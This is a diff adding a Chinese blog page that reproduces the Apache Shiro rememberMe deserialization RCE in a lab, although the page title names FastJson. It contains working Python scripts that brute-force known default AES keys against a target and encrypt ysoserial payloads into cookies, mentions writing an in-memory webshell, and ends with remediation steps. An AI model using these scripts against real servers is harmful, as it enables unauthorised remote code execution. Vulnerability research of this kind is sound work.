@@ -1,0 +1,214 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    qiu的博客
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a class="logo">qiu</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/th.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >FastJson反序列化漏洞复现</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h1><p> Apache Shiro框架提供了记住密码的功能（RememberMe），在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，并且AES加密密钥采用的是默认密钥，当攻击者按照该思路来构造payload并提交后会导致了反序列化RCE漏洞。</p>
+<h3 id="服务器端解密过程："><a href="#服务器端解密过程：" class="headerlink" title="服务器端解密过程："></a>服务器端解密过程：</h3><p> 安全管理器调用getRememberedPrincipals方法从subjectContext中封装的cookie字段中解析rememberMe的内容，但是CookieRememberMeManager管理器中并没有getRememberedPrincipals方法。</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151340133.png" class="" title="image-20220701151340133">
+
+<p>会调用父类AbstractRememberMeManager的getRememberedPrincipals方法。CookieRememberMeManager的构造器在初始化时会自动调用父类的构造设置AES解密的秘钥。</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151410853.png" class="" title="image-20220701151410853">
+
+<p>getRememberedSerializedIdentity方法返回的是一个byte类型的字节数组，该方法主要是从http请求中解析数据，然后进行base64解码</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151428160.png" class="" title="image-20220701151428160">
+
+<p>getRememberedSerializedIdentity方法返回之后，会判断是否有数据，如果有数据则调用convertBytesToPrincipals方法解密，接着调用deserialize方法反序列化</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151446026.png" class="" title="image-20220701151446026">
+
+<p>decrypt方法进行AES解密:</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151459895.png" class="" title="image-20220701151459895">
+
+<p>deserialize方法内部对于serialized参数中解密后的内容没有任何过滤和校验操作，而是进行了一个简单的不为null的判断，然后直接调用了readObject方法进行反序列化。</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151520056.png" class="" title="image-20220701151520056">
+
+<p><strong>流程：</strong></p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151534917.png" class="" title="image-20220701151534917">
+
+<h1 id="复现："><a href="#复现：" class="headerlink" title="复现："></a><strong>复现：</strong></h1><p>访问靶机页面：</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151636809.png" class="" title="image-20220701151636809">
+
+<p><strong>探测：</strong></p>
+<p>在响应体中发现rememberme&#x3D;deleteme:</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151715993.png" class="" title="image-20220701151715993">
+
+<p>在请求头cookie中增加字段rememberMe&#x3D;deleteMe后在响应头中返回rememberMe&#x3D;deleteMe</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151732178.png" class="" title="image-20220701151732178">
+
+<p>不登陆的情况下把cookie字段修改为rememberMe&#x3D;1，响应头中返回rememberMe&#x3D;delete</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151747043.png" class="" title="image-20220701151747043">
+
+<p><strong>利用工具检测key:</strong></p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151802396.png" class="" title="image-20220701151802396">
+
+<p>命令执行：</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151817749.png" class="" title="image-20220701151817749">
+
+<p>写内存马：</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151834247.png" class="" title="image-20220701151834247">
+
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151846522.png" class="" title="image-20220701151846522">
+
+<p><strong>手工：</strong></p>
+<p>利用ysoserial编译生成payload:</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701151910995.png" class="" title="image-20220701151910995">
+
+<p>探测key脚本（python）:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span></span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">target</span>):</span></span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>] 		<span class="comment"># 此处简单列举几个密钥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2lt&#x27;</span>+</span><br><span class="line">                                 <span class="string">&#x27;cGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG&#x27;</span>+</span><br><span class="line">                                 <span class="string">&#x27;1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBC加密</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,</span><br><span class="line">                               verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">&quot;正确KEY ： &quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    print(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCM加密</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, </span><br><span class="line">                               verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">&quot;正确KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    print(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            print(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br></pre></td></tr></table></figure>
+
+<p>加密过程（python）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>():</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;poc.ser&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()</span><br><span class="line">    print(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p>生成加密后的payload:</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701152027480-1457557.png" class="" title="image-20220701152027480">
+
+<p>在登录过程中修改cookie中的rememberme字段值</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701152041349.png" class="" title="image-20220701152041349">
+
+<p>在靶机上看到命令被执行：</p>
+<img src="/2022/07/12/Apache_Shiro_deserialization/Apache_Shiro_deserialization/image-20220701152055799.png" class="" title="image-20220701152055799">
+
+<h1 id="shiro反序列化漏洞的修复"><a href="#shiro反序列化漏洞的修复" class="headerlink" title="shiro反序列化漏洞的修复"></a><strong>shiro反序列化漏洞的修复</strong></h1><ol>
+<li>删除代码里的默认密钥</li>
+<li>默认配置里注释了默认密钥</li>
+<li>升级shiro到1.2.5及以上</li>
+<li>如果在配置里配置了密钥，不要使用网上的密钥</li>
+<li>自己base64一个AES的密钥，或者利用官方提供的方法生成密钥：org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li>
+</ol>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;2021.02.25<a href="" style="border-bottom: none;"></a></li>
+                <li>Create By <a target="_blank" rel="noopener" href="http://81.69.247.241" style="border-bottom: none;">qiu</a></li>
+            </ul>
+            
+				<span id="busuanzi_container_site_pv"> 2022 </span> 
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
